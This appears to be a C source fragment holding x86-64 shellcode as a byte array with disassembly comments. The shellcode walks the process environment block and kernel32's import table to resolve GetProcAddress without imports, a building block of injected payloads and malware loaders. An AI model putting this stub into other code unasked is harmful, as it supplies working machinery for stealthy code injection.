
// Target architecture : X86 64

#define LLAGPA_SIZE 164

char LLAGPA[] = {
  /* 0000 */ "\x56"                                     /* push   rsi                                     */
  /* 0001 */ "\x53"                                     /* push   rbx                                     */
  /* 0002 */ "\x57"                                     /* push   rdi                                     */
  /* 0003 */ "\x55"                                     /* push   rbp                                     */
  /* 0004 */ "\x6a\x60"                                 /* push   0x60                                    */
  /* 0006 */ "\x5a"                                     /* pop    rdx                                     */
  /* 0007 */ "\x65\x48\x8b\x02"                         /* mov    rax, qword ptr gs:[rdx]                 */
  /* 000B */ "\x48\x8b\x40\x18"                         /* mov    rax, qword ptr [rax + 0x18]             */
  /* 000F */ "\x48\x8b\x78\x10"                         /* mov    rdi, qword ptr [rax + 0x10]             */
  /* 0013 */ "\xeb\x03"                                 /* jmp    0x18                                    */
  /* 0015 */ "\x48\x8b\x3f"                             /* mov    rdi, qword ptr [rdi]                    */
  /* 0018 */ "\x48\x8b\x5f\x30"                         /* mov    rbx, qword ptr [rdi + 0x30]             */
  /* 001C */ "\x52"                                     /* push   rdx                                     */
  /* 001D */ "\x0f\xb7\x4f\x58"                         /* movzx  ecx, word ptr [rdi + 0x58]              */
  /* 0021 */ "\x48\x8b\x77\x60"                         /* mov    rsi, qword ptr [rdi + 0x60]             */
  /* 0025 */ "\xd1\xe9"                                 /* shr    ecx, 1                                  */
  /* 0027 */ "\x31\xc0"                                 /* xor    eax, eax                                */
  /* 0029 */ "\x99"                                     /* cdq                                            */
  /* 002A */ "\x66\xad"                                 /* lodsw  ax, word ptr [rsi]                      */
  /* 002C */ "\x0c\x20"                                 /* or     al, 0x20                                */
  /* 002E */ "\xc1\xca\x0d"                             /* ror    edx, 0xd                                */
  /* 0031 */ "\x01\xc2"                                 /* add    edx, eax                                */
  /* 0033 */ "\xe2\xf5"                                 /* loop   0x2a                                    */
  /* 0035 */ "\x81\xfa\x9f\xf7\xcc\x42"                 /* cmp    edx, 0x42ccf79f                         */
  /* 003B */ "\x5a"                                     /* pop    rdx                                     */
  /* 003C */ "\x75\xd7"                                 /* jne    0x15                                    */
  /* 003E */ "\x03\x53\x3c"                             /* add    edx, dword ptr [rbx + 0x3c]             */
  /* 0041 */ "\x8b\x74\x13\x30"                         /* mov    esi, dword ptr [rbx + rdx + 0x30]       */
  /* 0045 */ "\x48\x01\xde"                             /* add    rsi, rbx                                */
  /* 0048 */ "\xad"                                     /* lodsd  eax, dword ptr [rsi]                    */
  /* 0049 */ "\x92"                                     /* xchg   eax, edx                                */
  /* 004A */ "\x48\xad"                                 /* lodsq  rax, qword ptr [rsi]                    */
  /* 004C */ "\xad"                                     /* lodsd  eax, dword ptr [rsi]                    */
  /* 004D */ "\x91"                                     /* xchg   eax, ecx                                */
  /* 004E */ "\xad"                                     /* lodsd  eax, dword ptr [rsi]                    */
  /* 004F */ "\x97"                                     /* xchg   eax, edi                                */
  /* 0050 */ "\x48\xb8\x6b\x65\x72\x6e\x65\x6c\x33\x32" /* movabs rax, 0x32336c656e72656b                 */
  /* 005A */ "\x48\x8b\x0c\x0b"                         /* mov    rcx, qword ptr [rbx + rcx]              */
  /* 005E */ "\x48\xbd\x20\x20\x20\x20\x20\x20\x20\x20" /* movabs rbp, 0x2020202020202020                 */
  /* 0068 */ "\x48\x09\xe9"                             /* or     rcx, rbp                                */
  /* 006B */ "\x48\x39\xc8"                             /* cmp    rax, rcx                                */
  /* 006E */ "\x75\xd8"                                 /* jne    0x48                                    */
  /* 0070 */ "\x48\x8d\x34\x1a"                         /* lea    rsi, qword ptr [rdx + rbx]              */
  /* 0074 */ "\x48\x01\xdf"                             /* add    rdi, rbx                                */
  /* 0077 */ "\x48\xad"                                 /* lodsq  rax, qword ptr [rsi]                    */
  /* 0079 */ "\x48\xaf"                                 /* scasq  rax, qword ptr [rdi]                    */
  /* 007B */ "\x91"                                     /* xchg   eax, ecx                                */
  /* 007C */ "\x67\xe3\x1e"                             /* jecxz  0x9d                                    */
  /* 007F */ "\x0f\xba\xf1\x1f"                         /* btr    ecx, 0x1f                               */
  /* 0083 */ "\x72\xf2"                                 /* jb     0x77                                    */
  /* 0085 */ "\x81\x7c\x19\x02\x47\x65\x74\x50"         /* cmp    dword ptr [rcx + rbx + 2], 0x50746547   */
  /* 008D */ "\x75\xe8"                                 /* jne    0x77                                    */
  /* 008F */ "\x81\x7c\x19\x0a\x64\x64\x72\x65"         /* cmp    dword ptr [rcx + rbx + 0xa], 0x65726464 */
  /* 0097 */ "\x75\xde"                                 /* jne    0x77                                    */
  /* 0099 */ "\x48\x8b\x4f\xf8"                         /* mov    rcx, qword ptr [rdi - 8]                */
  /* 009D */ "\x51"                                     /* push   rcx                                     */
  /* 009E */ "\x58"                                     /* pop    rax                                     */
  /* 009F */ "\x5d"                                     /* pop    rbp                                     */
  /* 00A0 */ "\x5f"                                     /* pop    rdi                                     */
  /* 00A1 */ "\x5b"                                     /* pop    rbx                                     */
  /* 00A2 */ "\x5e"                                     /* pop    rsi                                     */
  /* 00A3 */ "\xc3"                                     /* ret                                            */
};
